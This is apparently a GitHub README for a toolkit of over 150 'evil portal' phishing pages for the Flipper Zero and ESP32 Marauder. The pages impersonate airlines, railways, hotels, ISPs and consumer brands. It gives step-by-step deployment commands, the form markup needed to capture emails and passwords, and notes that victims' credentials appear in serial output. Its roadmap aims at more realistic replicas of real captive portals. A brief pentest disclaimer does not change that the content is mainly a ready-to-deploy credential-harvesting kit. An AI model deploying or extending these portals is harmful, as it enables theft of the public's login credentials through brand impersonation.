```
 .o88o. oooo   o8o                                                                                     .             oooo
 888 `" `888   `"'                                                                                   .o8             `888
o888oo   888  oooo  oo.ooooo.  oo.ooooo.   .ooooo.  oooo d8b         oo.ooooo.   .ooooo.  oooo d8b .o888oo  .oooo.    888   .oooo.o
 888     888  `888   888' `88b  888' `88b d88' `88b `888""8P          888' `88b d88' `88b `888""8P   888   `P  )88b   888  d88(  "8
 888     888   888   888   888  888   888 888ooo888  888     8888888  888   888 888   888  888       888    .oP"888   888  `"Y88b.
 888     888   888   888   888  888   888 888    .o  888              888   888 888   888  888       888 . d8(  888   888  o.  )88b
o888o   o888o o888o  888bod8P'  888bod8P' `Y8bod8P' d888b             888bod8P' `Y8bod8P' d888b      "888" `Y888""8o o888o 8""888P'
                     888        888                                   888
                    o888o      o888o                                 o888o
```

> A collection of **150+ evil portal templates** for the Flipper Zero WiFi Dev Board + ESP32 Marauder. Includes custom-built portals, US & European brand portals, and tooling to deploy them.

```
    +-------------------------------+
    |        FLIPPER PORTALS        |
    |                               |
    |    +=====================+    |
    |    |   [x] Free WiFi    |     |
    |    |   +-------------+  |     |
    |    |   | Email       |  |     |
    |    |   | Password    |  |     |
    |    |   | [CONNECT]   |  |     |
    |    |   +-------------+  |     |
    |    +=====================+    |
    +-------------------------------+
```

## ⚠️ Disclaimer

**For authorized penetration testing and security research only.** Only use these on networks you own or have explicit written permission to test. Unauthorized credential harvesting is illegal. The author takes no responsibility for misuse.

## 📦 What's Inside

| Category            | Count   | Description                                                  |
| ------------------- | ------- | ------------------------------------------------------------ |
| 🎨 **Custom**       | 4       | Hand-crafted portals with modern UI                          |
| 🇺🇸 **Premade (US)** | 26      | Google, Facebook, Apple, Microsoft, airlines, ISPs           |
| 🇪🇺 **European**     | 124     | Airlines, railways, hotels, gyms, ISPs, supermarkets, brands |
| **Total**           | **154** | Ready to deploy                                              |

### Custom Portals

| Portal          | Style                                    | Best For                      |
| --------------- | ---------------------------------------- | ----------------------------- |
| `CafeWiFi`      | Glassmorphism dark theme with Google SSO | Public WiFi, cafés, coworking |
| `HotelGuest`    | Luxury hotel (dark + gold)               | Hotels, B&Bs, Airbnbs         |
| `CoffeeShop`    | Warm earthy tones, newsletter opt-in     | Coffee shops, bakeries        |
| `CorporateWiFi` | Corporate blue with security warnings    | Office networks, corporate    |

### European Portals (great for EU pentesting)

- **Airlines**: Brussels Airlines, Ryanair, EasyJet, KLM, Lufthansa, Air France, British Airways, Turkish Airlines, SwissAir
- **Railways**: SNCB/NMBS (Belgian Rail 🇧🇪), Thalys, SNCF, Deutsche Bahn, NS (Dutch Rail), National Rail, Renfe
- **Hotels**: Hilton, Ibis, Novotel, Sheraton, Radisson, Best Western
- **Fast Food & Coffee**: McDonald's, Starbucks, KFC, Quick, Pizza Hut
- **Supermarkets**: Delhaize 🇧🇪, IKEA, Tesco
- **Gyms**: Basic-Fit, Anytime Fitness, McFIT, Fitness First
- **ISPs**: Proximus 🇧🇪, Vodafone, Deutsche Telekom, Orange, BT, Telefónica
- **Brands**: Apple, Nike, Coca-Cola, Red Bull, Carlsberg
- **WiFi Routers**: TP-Link, NETGEAR, Linksys, Ubiquiti/UniFi, D-Link, Tenda, Apple AirPort
- **Theme Parks**: Walibi 🇧🇪, Efteling, Disneyland Paris

Many EU portals include **"Forgot Password"** variants for extra realism.

## 🚀 Quick Start

### Prerequisites

- [Flipper Zero](https://flipperzero.one/) with WiFi Dev Board
- [ESP32 Marauder](https://github.com/justcallmekoko/ESP32Marauder) firmware flashed on the dev board
- [Marauder companion app](https://lab.flipper.net/apps/esp32_wifi_marauder) installed on Flipper

### 1. Download All Portals

```bash
git clone https://github.com/L_ubu/flipper-portals.git
cd flipper-portals
```

### 2. Preview a Portal

```bash
# Open in browser to see what it looks like
./deploy.sh preview custom/CafeWiFi.html
./deploy.sh preview european/Railway-Companies_SNCB-NMBS-\(Belgian-Rail\).html
```

### 3. Deploy to Flipper

```bash
# Stage a portal with a custom AP name
./deploy.sh deploy custom/CafeWiFi.html "Free_Coffee_WiFi"

# Then copy staged files to Flipper SD card:
# SD Card/apps_data/marauder/index.html
# SD Card/apps_data/marauder/ap.config.txt
```

### 4. Run on Flipper

1. Plug WiFi Dev Board into Flipper's GPIO
2. Open **Apps > GPIO > ESP32 WiFi Marauder**
3. Run: `evilportal -c start`
4. Victims connect to your AP → see the portal → enter creds
5. Creds appear in serial output. Stop with `stopscan`

## 🛠️ Deploy Tool

The `deploy.sh` script helps manage and deploy portals:

```bash
./deploy.sh list                    # List all portals with sizes
./deploy.sh preview <file>          # Open in browser
./deploy.sh size <file>             # Check 20KB limit
./deploy.sh deploy <file> [AP name] # Stage for Flipper transfer
./deploy.sh deploy-all              # Stage ALL portals
./deploy.sh set-ap "WiFi Name"      # Change AP name
```

> **Note:** Marauder has a **20KB file size limit** for portal HTML files. Use `./deploy.sh size` to verify before deploying.

## 📂 Project Structure

```
flipper-portals/
├── portals/
│   ├── custom/           # 4 hand-crafted portal templates
│   ├── bigbrodude/       # 26 US-focused portals
│   └── european/         # 124 European brand portals
├── staging/              # Ready-to-deploy files for Flipper
├── configs/              # AP config files
├── deploy.sh             # Deploy & management tool
├── download-portals.sh   # Re-download premade portals
└── README.md
```

## 🎨 Creating Custom Portals

Portal HTML files must:

- Be a single self-contained `.html` file (no external resources)
- Use `<form method="POST" action="/get">` for the form
- Have `name="email"` and `name="password"` on the input fields
- Stay **under 20KB** total file size
- Use inline CSS (no external stylesheets)
- Use inline SVGs instead of image URLs

```html
<form method="POST" action="/get">
  <input name="email" type="text" placeholder="Email" required />
  <input name="password" type="password" placeholder="Password" required />
  <button type="submit">Connect</button>
</form>
```

## 🙏 Credits

- Custom portals by [@L_ubu](https://github.com/L_ubu)
- US portals from [bigbrodude6119/flipper-zero-evil-portal](https://github.com/bigbrodude6119/flipper-zero-evil-portal)
- European portals from [FlippieHacks/FlipperZeroEuropeanPortals](https://github.com/FlippieHacks/FlipperZeroEuropeanPortals)
- [ESP32 Marauder](https://github.com/justcallmekoko/ESP32Marauder) by justcallmekoko

## 🗺️ Roadmap

- [ ] Rework existing portals to be more realistic and pixel-perfect
- [ ] Create exact replicas of real captive portals encountered in the wild
- [ ] Add Belgian-specific portals (Telenet, De Lijn, Flixbus, university portals)
- [ ] Mobile-first responsive designs (most victims connect via phone)
- [ ] Add "success" redirect pages (post-login screens for extra realism)
- [ ] Portal generator script — input a brand name/color/logo SVG, get a portal
- [ ] Size optimizer to auto-minify portals that exceed 20KB
- [ ] Screenshot gallery in README for each portal

## 📄 License

MIT — Do whatever you want, just don't be evil (ironically).
